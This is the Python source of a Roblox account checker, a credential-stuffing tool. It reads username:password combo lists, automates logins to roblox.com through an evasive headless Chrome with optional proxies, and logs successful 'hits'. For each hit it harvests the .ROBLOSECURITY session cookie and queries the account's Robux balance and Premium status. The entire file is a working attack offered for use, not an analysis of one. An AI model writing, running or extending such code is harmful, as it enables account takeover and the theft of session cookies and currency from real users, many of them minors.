# checker.py - Complete fixed version for web
import os
import sys
import json
import time
import random
import threading
import queue
import logging
import subprocess
import re
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
from dataclasses import dataclass, field

# Import dependencies
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException,
        WebDriverException, ElementNotInteractableException,
        ElementClickInterceptedException, StaleElementReferenceException,
        InvalidSessionIdException, NoSuchWindowException
    )
    import undetected_chromedriver as uc
    from webdriver_manager.chrome import ChromeDriverManager
    import requests
except ImportError as e:
    print(f"[-] Missing dependency: {e}")
    print("[!] Please install: pip install -r requirements.txt")
    raise


@dataclass
class Account:
    username: str
    password: str
    status: str = "unchecked"
    robux: int = 0
    premium: bool = False
    friends: int = 0
    cookies: Optional[Dict] = None
    proxy_used: Optional[str] = None
    verification_time: float = 0.0
    message: str = ""
    user_id: str = ""
    display_name: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    description: str = ""
    account_age: str = ""
    join_date: str = ""
    followers: int = 0
    following: int = 0
    badges: int = 0
    groups: List[Dict] = field(default_factory=list)
    groups_count: int = 0
    top_groups: str = ""
    collectibles: int = 0
    wearing_items: List[str] = field(default_factory=list)
    account_banned: bool = False


class VerificationMode(Enum):
    NORMAL = "normal"
    HEADLESS = "headless"
    STEALTH = "stealth"
    RAPID = "rapid"


class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.active_proxies = []
        self.failed_proxies = []
        self.last_use = {}
        self.success_count = {}
        self.fail_count = {}
    
    def load_proxies(self, file_path: str):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.proxies.append(line)
            print(f"[+] {len(self.proxies)} proxies loaded")
            self.active_proxies = self.proxies.copy()
            return True
        except Exception as e:
            print(f"[-] Error loading proxies: {e}")
            return False
    
    def get_proxy(self):
        if not self.active_proxies:
            return None
        return random.choice(self.active_proxies) if self.active_proxies else None
    
    def report_success(self, proxy: str):
        pass
    
    def report_failure(self, proxy: str):
        pass


class DriverManager:
    def __init__(self):
        self.active_drivers = {}
        self.driver_path = None
        self.setup_driver_path()
    
    def setup_driver_path(self):
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            self.driver_path = ChromeDriverManager().install()
            print(f"[+] ChromeDriver ready: {self.driver_path}")
            return True
        except Exception as e:
            print(f"[-] Webdriver-manager failed: {e}")
            return False
    
    def create_driver(self, mode: VerificationMode, proxy: str = None, worker_id: int = 0):
        try:
            from selenium.webdriver.chrome.service import Service
            
            options = Options()
            
            base_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "--log-level=3",
            ]
            
            if mode == VerificationMode.HEADLESS:
                base_args.append("--headless=new")
                base_args.append("--disable-gpu")
                base_args.append("--window-size=1920,1080")
                base_args.append("--disable-software-rasterizer")
                base_args.append("--disable-setuid-sandbox")
            elif mode == VerificationMode.STEALTH:
                base_args.extend([
                    "--disable-web-security",
                    "--allow-running-insecure-content",
                    "--disable-features=IsolateOrigins,site-per-process",
                ])
                options.add_experimental_option("excludeSwitches", ["enable-automation"])
                options.add_experimental_option('useAutomationExtension', False)
            
            for arg in base_args:
                options.add_argument(arg)
            
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
            
            prefs = {
                "credentials_enable_service": False,
                "profile.password_manager_enabled": False,
                "profile.default_content_setting_values.notifications": 2,
                "intl.accept_languages": "en-US,en",
            }
            options.add_experimental_option("prefs", prefs)
            
            # Try to create driver with webdriver-manager
            try:
                service = Service(ChromeDriverManager().install())
                if mode == VerificationMode.STEALTH:
                    driver = uc.Chrome(service=service, options=options)
                else:
                    driver = webdriver.Chrome(service=service, options=options)
                print(f"[+] Driver created successfully with webdriver-manager")
            except Exception as e:
                print(f"[-] Webdriver-manager failed: {e}")
                # Fallback to direct Chrome
                if mode == VerificationMode.STEALTH:
                    driver = uc.Chrome(options=options)
                else:
                    driver = webdriver.Chrome(options=options)
                print(f"[+] Driver created with default Chrome")
            
            timeout = 10 if mode == VerificationMode.RAPID else 20
            driver.set_page_load_timeout(timeout)
            driver.set_script_timeout(timeout)
            driver.implicitly_wait(5)
            
            self.active_drivers[f"worker_{worker_id}"] = driver
            return driver
            
        except Exception as e:
            print(f"[-] Error creating driver: {e}")
            return None
    
    def cleanup_drivers(self):
        for driver in self.active_drivers.values():
            try:
                driver.quit()
            except:
                pass
        self.active_drivers.clear()


class RobloxAPILookup:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def get_user_id(self, username):
        try:
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [username], "excludeBannedUsers": False}
            response = self.session.post(url, json=payload, timeout=10)
            data = response.json().get("data", [])
            if data and len(data) > 0:
                return data[0].get("id")
            return None
        except Exception:
            return None
    
    def get_robux_balance(self, user_id, cookie):
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("robux", 0)
            return 0
        except Exception:
            return 0
    
    def check_premium_status(self, user_id, cookie):
        try:
            url = "https://premiumfeatures.roblox.com/v1/user/premium"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("isPremium", False)
            return False
        except Exception:
            return False


class AntraxRblxChecker:
    def __init__(self):
        self.accounts: List[Account] = []
        self.proxy_manager = ProxyManager()
        self.driver_manager = DriverManager()
        self.api_lookup = RobloxAPILookup()
        
        self.mode = VerificationMode.HEADLESS
        self.min_delay = 3.0
        self.max_delay = 5.0
        self.max_workers = 1
        self.max_accounts_per_test = 999999
        
        self.running = True
        self.paused = False
        self.lock = threading.Lock()
        
        self.recent_results = []
        self.web_results = []
        
        self.stats = {
            'total': 0,
            'verified': 0,
            'valid': 0,
            'wrong_password': 0,
            'captcha': 0,
            'rate_limit': 0,
            'timeout': 0,
            'blocked': 0,
            'driver_error': 0,
            'other_errors': 0,
            'start_time': time.time(),
            'premium_accounts': 0,
            'total_robux': 0
        }
    
    def load_accounts(self, file_path: str):
        try:
            loaded_accounts = 0
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            username, password = parts
                            if username and password:
                                self.accounts.append(Account(
                                    username=username.strip(),
                                    password=password.strip()
                                ))
                                loaded_accounts += 1
            
            self.stats['total'] = len(self.accounts)
            print(f"\n[+] {loaded_accounts} accounts loaded")
            if self.accounts:
                print(f"[*] First account: {self.accounts[0].username}")
            return True
            
        except Exception as e:
            print(f"[-] Error loading accounts: {e}")
            return False
    
    def load_proxies(self, file_path: str):
        return self.proxy_manager.load_proxies(file_path)
    
    def get_cookie_from_driver(self, driver) -> Optional[str]:
        try:
            cookies = driver.get_cookies()
            for cookie in cookies:
                if cookie.get('name') == '.ROBLOSECURITY':
                    return cookie.get('value')
            return None
        except Exception:
            return None
    
    def safe_find_element(self, driver, selector: str, by=By.ID, timeout=5):
        try:
            element = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((by, selector))
            )
            return element
        except Exception:
            return None
    
    def verify_account(self, account: Account, worker_id: int = 0) -> Account:
        driver = None
        start_time = time.time()
        
        if not self.running:
            account.status = "cancelled"
            account.message = "Cancelled by user"
            return account
        
        try:
            print(f"[DEBUG] Creating driver for {account.username}")
            driver = self.driver_manager.create_driver(self.mode, None, worker_id)
            
            if not driver:
                print(f"[DEBUG] Driver creation failed for {account.username}")
                account.status = "driver_error"
                account.message = "Failed to create driver"
                return account
            
            print(f"[DEBUG] Driver created, navigating to login for {account.username}")
            
            try:
                driver.get("https://www.roblox.com/login")
                print(f"[DEBUG] Page loaded: {driver.current_url}")
                WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.ID, "login-username"))
                )
                print(f"[DEBUG] Login page loaded for {account.username}")
            except TimeoutException as e:
                print(f"[DEBUG] Login page timeout for {account.username}: {e}")
                account.status = "timeout"
                account.message = "Login page timeout"
                return account
            except Exception as e:
                print(f"[DEBUG] Login page error for {account.username}: {e}")
                account.status = "timeout"
                account.message = f"Page error: {str(e)[:30]}"
                return account
            
            time.sleep(random.uniform(1, 2))
            
            try:
                print(f"[DEBUG] Finding username field for {account.username}")
                username_field = self.safe_find_element(driver, "login-username", By.ID, 5)
                if not username_field:
                    print(f"[DEBUG] Username field not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Username field not found"
                    return account
                
                username_field.clear()
                username_field.send_keys(account.username)
                print(f"[DEBUG] Username entered for {account.username}")
                time.sleep(random.uniform(0.3, 0.6))
                
                print(f"[DEBUG] Finding password field for {account.username}")
                password_field = self.safe_find_element(driver, "login-password", By.ID, 5)
                if not password_field:
                    print(f"[DEBUG] Password field not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Password field not found"
                    return account
                
                password_field.clear()
                password_field.send_keys(account.password)
                print(f"[DEBUG] Password entered for {account.username}")
                time.sleep(random.uniform(0.3, 0.6))
                
                print(f"[DEBUG] Finding login button for {account.username}")
                login_button = self.safe_find_element(driver, "login-button", By.ID, 5)
                if not login_button:
                    print(f"[DEBUG] Login button not found for {account.username}")
                    account.status = "element_error"
                    account.message = "Login button not found"
                    return account
                
                login_button.click()
                print(f"[DEBUG] Login button clicked for {account.username}")
                
            except Exception as e:
                print(f"[DEBUG] Login interaction error for {account.username}: {e}")
                account.status = "element_error"
                account.message = f"Login error: {str(e)[:30]}"
                return account
            
            # Wait for response - check for both success and failure
            wait_time = 0
            max_wait = 30
            
            while wait_time < max_wait and self.running:
                time.sleep(1)
                wait_time += 1
                
                try:
                    current_url = driver.current_url.lower()
                    print(f"[DEBUG] {account.username} - URL: {current_url} (wait {wait_time}s)")
                    
                    # Check for successful login - any URL that's not login page
                    if "login" not in current_url and "signup" not in current_url:
                        print(f"[DEBUG] Login successful for {account.username} - URL: {current_url}")
                        account.status = "valid"
                        account.message = "Login successful"
                        account.verification_time = time.time() - start_time
                        
                        # Get cookie and account data
                        try:
                            cookie = self.get_cookie_from_driver(driver)
                            if cookie:
                                account.cookies = {'.ROBLOSECURITY': cookie}
                                print(f"[DEBUG] Cookie obtained for {account.username}")
                                user_id = self.api_lookup.get_user_id(account.username)
                                if user_id:
                                    account.user_id = str(user_id)
                                    account.robux = self.api_lookup.get_robux_balance(user_id, cookie)
                                    account.premium = self.api_lookup.check_premium_status(user_id, cookie)
                                    print(f"[DEBUG] Account data: ID: {user_id}, Robux: {account.robux}, Premium: {account.premium}")
                        except Exception as e:
                            print(f"[DEBUG] Error getting account data: {e}")
                        
                        return account
                    
                    # Check for error messages on the page
                    try:
                        # Get page text
                        page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
                        
                        # Check for error keywords
                        error_keywords = [
                            "incorrect username or password",
                            "wrong password",
                            "invalid username",
                            "incorrect",
                            "wrong",
                            "rate limit",
                            "too many attempts",
                            "captcha"
                        ]
                        
                        for keyword in error_keywords:
                            if keyword in page_text:
                                print(f"[DEBUG] Error detected: '{keyword}' for {account.username}")
                                if "incorrect" in keyword or "wrong" in keyword or "invalid" in keyword:
                                    account.status = "invalid_password"
                                    account.message = "Wrong password"
                                    return account
                                elif "rate" in keyword or "too many" in keyword:
                                    account.status = "rate_limit"
                                    account.message = "Rate limited"
                                    return account
                                elif "captcha" in keyword:
                                    account.status = "captcha"
                                    account.message = "CAPTCHA detected"
                                    return account
                    except:
                        pass
                    
                    # Check for error elements
                    try:
                        error_selectors = [
                            "#login-form-error",
                            "#password-error",
                            ".alert-danger",
                            ".error-message",
                            ".login-error-message",
                            "[data-testid='login-error-message']",
                            ".form-error"
                        ]
                        
                        for selector in error_selectors:
                            try:
                                error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                                for el in error_elements:
                                    if el.is_displayed():
                                        error_text = el.text.lower()
                                        print(f"[DEBUG] Error element found: {error_text} for {account.username}")
                                        if "incorrect" in error_text or "wrong" in error_text:
                                            account.status = "invalid_password"
                                            account.message = "Wrong password"
                                            return account
                                        elif "rate" in error_text:
                                            account.status = "rate_limit"
                                            account.message = "Rate limited"
                                            return account
                            except:
                                pass
                    except:
                        pass
                    
                    # Check for CAPTCHA
                    try:
                        iframes = driver.find_elements(By.TAG_NAME, "iframe")
                        for iframe in iframes:
                            src = iframe.get_attribute("src") or ""
                            if "recaptcha" in src or "captcha" in src:
                                print(f"[DEBUG] CAPTCHA detected for {account.username}")
                                account.status = "captcha"
                                account.message = "CAPTCHA detected"
                                return account
                    except:
                        pass
                    
                    # If we're still on login page after 8 seconds, assume wrong password
                    if "login" in current_url and wait_time > 8:
                        print(f"[DEBUG] Still on login page after {wait_time}s for {account.username} - assuming wrong password")
                        account.status = "invalid_password"
                        account.message = "Wrong password"
                        return account
                    
                except Exception as e:
                    print(f"[DEBUG] Error analyzing result for {account.username}: {e}")
                    continue
            
            account.status = "timeout"
            account.message = "Verification timeout"
            print(f"[DEBUG] Timeout for {account.username}")
            return account
            
        except Exception as e:
            print(f"[DEBUG] Unexpected error for {account.username}: {e}")
            account.status = "error"
            account.message = f"Error: {str(e)[:40]}"
            return account
        finally:
            if driver:
                try:
                    driver.quit()
                    print(f"[DEBUG] Driver closed for {account.username}")
                except:
                    pass
    
    def start_verification_simple(self):
        """Single-threaded verification for web interface"""
        print("[DEBUG] start_verification_simple called")
        
        if not self.accounts:
            self.web_results = ["No accounts to verify"]
            print("[DEBUG] No accounts to verify")
            return
        
        self.running = True
        self.web_results = []
        self.recent_results = []
        
        total = len(self.accounts[:self.max_accounts_per_test])
        
        self.web_results.append("=" * 50)
        self.web_results.append("STARTING VERIFICATION")
        self.web_results.append(f"Accounts: {total}")
        self.web_results.append(f"Mode: {self.mode.value}")
        self.web_results.append("=" * 50)
        
        print(f"[DEBUG] Starting verification of {total} accounts")
        
        self.stats['start_time'] = time.time()
        
        for idx, account in enumerate(self.accounts[:self.max_accounts_per_test], 1):
            if not self.running:
                self.web_results.append("Stopped by user")
                break
            
            print(f"[DEBUG] [{idx}/{total}] Checking: {account.username}")
            self.web_results.append(f"[{idx}/{total}] Checking: {account.username}")
            
            result = self.verify_account(account, idx)
            self.stats['verified'] += 1
            
            if result.status == 'valid':
                self.stats['valid'] += 1
                if result.premium:
                    self.stats['premium_accounts'] += 1
                if result.robux > 0:
                    self.stats['total_robux'] += result.robux
                
                hit_msg = f"[HIT] {result.username} | R${result.robux}"
                if result.premium:
                    hit_msg += " [PREMIUM]"
                if result.user_id:
                    hit_msg += f" | ID: {result.user_id}"
                self.web_results.append(hit_msg)
                print(f"[DEBUG] {hit_msg}")
                
            elif result.status == 'invalid_password':
                self.stats['wrong_password'] += 1
                msg = f"[WRONG] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
                
            elif result.status == 'captcha':
                self.stats['captcha'] += 1
                msg = f"[CAPTCHA] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
                
            elif result.status == 'timeout':
                self.stats['timeout'] += 1
                msg = f"[TIMEOUT] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
                
            elif result.status == 'rate_limit':
                self.stats['rate_limit'] += 1
                msg = f"[RATE] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
                
            elif result.status == 'driver_error':
                self.stats['driver_error'] += 1
                msg = f"[DRIVER] {result.username}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
                
            else:
                self.stats['other_errors'] += 1
                msg = f"[ERROR] {result.username}: {result.message[:30]}"
                self.web_results.append(msg)
                print(f"[DEBUG] {msg}")
            
            if len(self.web_results) > 200:
                self.web_results = self.web_results[-200:]
            
            if idx < total and self.running:
                delay = random.uniform(self.min_delay, self.max_delay)
                time.sleep(delay)
        
        summary = [
            "",
            "=" * 50,
            "VERIFICATION COMPLETE",
            "=" * 50,
            f"Total checked: {self.stats['verified']}",
            f"Valid hits: {self.stats['valid']}",
            f"Premium: {self.stats['premium_accounts']}",
            f"Total Robux: {self.stats['total_robux']:,}",
            "=" * 50
        ]
        
        for line in summary:
            self.web_results.append(line)
            print(f"[DEBUG] {line}")
        
        print("[DEBUG] start_verification_simple completed")
    
    def start_verification(self):
        """Original multi-threaded verification (for CLI use)"""
        if not self.accounts:
            print("[-] No accounts")
            return
        
        self.running = True
        self.paused = False
        self.recent_results = []
        
        accounts_to_verify = self.accounts[:self.max_accounts_per_test]
        
        print("\n" + "=" * 70)
        print("[*] STARTING VERIFICATION")
        print(f"[*] Mode: {self.mode.value}")
        print(f"[*] Workers: {self.max_workers}")
        print(f"[*] Delay: {self.min_delay}-{self.max_delay}s")
        print(f"[*] Accounts: {len(accounts_to_verify)}/{len(self.accounts)}")
        print(f"[*] Proxies: {len(self.proxy_manager.active_proxies) if self.proxy_manager.proxies else 'None'}")
        print("=" * 70)
        
        work_queue = queue.Queue()
        for account in accounts_to_verify:
            work_queue.put(account)
        
        workers = []
        results = queue.Queue()
        
        for i in range(self.max_workers):
            w = threading.Thread(
                target=self.worker_function,
                args=(i+1, work_queue, results),
                daemon=True
            )
            w.start()
            workers.append(w)
            print(f"[*] Worker {i+1} started")
        
        self.monitor_progress(results, len(accounts_to_verify))
        self.driver_manager.cleanup_drivers()
        self.show_final_statistics()
    
    def worker_function(self, worker_id: int, work_queue: queue.Queue, results_queue: queue.Queue):
        while not work_queue.empty() and self.check_execution():
            try:
                account = work_queue.get_nowait()
                verified_account = self.verify_account(account, worker_id)
                self.update_statistics(verified_account.status)
                
                if self.check_execution():
                    delay = random.uniform(self.min_delay, self.max_delay)
                    time.sleep(delay)
                
                work_queue.task_done()
                results_queue.put((worker_id, verified_account))
                
            except queue.Empty:
                break
            except Exception as e:
                if self.check_execution():
                    print(f"[-] Worker {worker_id} error: {e}")
                work_queue.task_done()
                results_queue.put((worker_id, Account("ERROR", "", "worker_error", message=str(e))))
    
    def check_execution(self):
        with self.lock:
            if not self.running:
                return False
            while self.paused and self.running:
                time.sleep(0.5)
            return self.running
    
    def update_statistics(self, status: str):
        if not self.check_execution():
            return
        
        self.stats['verified'] += 1
        
        mapping = {
            'valid': 'valid',
            'invalid_password': 'wrong_password',
            'captcha': 'captcha',
            'rate_limit': 'rate_limit',
            'timeout': 'timeout',
            'blocked': 'blocked',
            'driver_error': 'driver_error',
            'error': 'other_errors'
        }
        
        if status in mapping:
            self.stats[mapping[status]] += 1
    
    def monitor_progress(self, results_queue: queue.Queue, total: int):
        last_update = 0
        processed_results = []
        
        os.system('cls' if os.name == 'nt' else 'clear')
        
        try:
            while self.check_execution():
                try:
                    worker_id, account = results_queue.get(timeout=1)
                    
                    if account.status == 'valid':
                        premium_tag = " [PREMIUM]" if account.premium else ""
                        robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
                        result_line = f"W{worker_id} [HIT] {account.username} | {account.message}{robux_tag}{premium_tag}"
                    else:
                        symbols = {
                            'valid': '[HIT]',
                            'invalid_password': '[WRONG]',
                            'captcha': '[CAPTCHA]',
                            'rate_limit': '[RATE]',
                            'timeout': '[TIMEOUT]',
                            'blocked': '[BLOCKED]',
                            'driver_error': '[DRIVER]',
                            'error': '[ERROR]',
                            'cancelled': '[STOPPED]'
                        }
                        symbol = symbols.get(account.status, '[?]')
                        result_line = f"W{worker_id} {symbol} {account.username} | {account.message}"
                    
                    processed_results.append(result_line)
                    
                    if len(processed_results) > 10:
                        processed_results.pop(0)
                    
                    results_queue.task_done()
                    
                except queue.Empty:
                    pass
                
                if time.time() - last_update > 0.5:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    
                    print("=" * 70)
                    print("   ATX ROBLOX CHECKER")
                    print("=" * 70)
                    
                    elapsed = time.time() - self.stats['start_time']
                    minutes = elapsed / 60 if elapsed > 0 else 0
                    speed = self.stats['verified'] / minutes if minutes > 0 else 0
                    hit_rate = (self.stats['valid'] / self.stats['verified'] * 100) if self.stats['verified'] > 0 else 0
                    
                    print("\n[ LIVE STATISTICS ]")
                    print("-" * 50)
                    print(f"  Progress:     {self.stats['verified']}/{total} ({hit_rate:.1f}%)")
                    print(f"  Hits:         {self.stats['valid']}")
                    print(f"  Premium:      {self.stats['premium_accounts']}")
                    print(f"  Total Robux:  {self.stats['total_robux']:,}")
                    print(f"  Wrong Pass:   {self.stats['wrong_password']}")
                    print(f"  CAPTCHA:      {self.stats['captcha']}")
                    print(f"  Rate Limit:   {self.stats['rate_limit']}")
                    print(f"  Timeouts:     {self.stats['timeout']}")
                    print(f"  Speed:        {speed:.1f}/min")
                    print("-" * 50)
                    
                    print("\n[ RECENT RESPONSES ]")
                    print("-" * 50)
                    for line in processed_results[-10:]:
                        print(f"  {line}")
                    print("-" * 50)
                    
                    last_update = time.time()
                    
                    if self.stats['verified'] >= total:
                        break
                    
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
    
    def show_final_statistics(self):
        if not self.running:
            print("[!] Verification cancelled")
            return
            
        elapsed = time.time() - self.stats['start_time']
        minutes = elapsed / 60
        
        print("\n" + "=" * 70)
        print("[ FINAL REPORT ]")
        print("=" * 70)
        print(f"Time: {minutes:.1f} min")
        print(f"Verified: {self.stats['verified']}")
        
        if self.stats['valid'] > 0:
            print(f"\n[+] HITS: {self.stats['valid']}")
            print(f"[+] Premium Accounts: {self.stats['premium_accounts']}")
            print(f"[+] Total Robux: {self.stats['total_robux']:,}")
            print(f"\n[+] Generated files:")
            print(f"    - valid_result.txt (Complete account info)")
            print(f"    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")
        
        if self.stats['verified'] > 0:
            rate = (self.stats['valid'] / self.stats['verified']) * 100
            print(f"\nHit rate: {rate:.1f}%")
            if minutes > 0:
                speed = self.stats['verified'] / minutes
                print(f"Speed: {speed:.1f} accounts/min")
        
        print("=" * 70)

def show_banner():
    print("=" * 70)
    print("   ATX ROBLOX CHECKER")
    print("   Created by: @AntraxdevZ")
    print("=" * 70)


def get_input(prompt, default=None, input_type=str):
    while True:
        value = input(prompt)
        if not value.strip() and default is not None:
            return default
        try:
            return input_type(value.strip())
        except ValueError:
            print(f"[-] Invalid input.")


def main():
    show_banner()
    print("\n" + "-" * 70)
    print("CONFIGURATION")
    print("-" * 70)
    
    while True:
        combo_file = input("\n[?] Enter combo file path: ").strip()
        if os.path.exists(combo_file):
            break
        print(f"[-] File not found: {combo_file}")
    
    checker = AntraxRblxChecker()
    
    if not checker.load_accounts(combo_file):
        print("[-] Failed to load accounts. Exiting.")
        sys.exit(1)
    
    try:
        checker.start_verification_simple()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        checker.running = False


if __name__ == "__main__":
    main()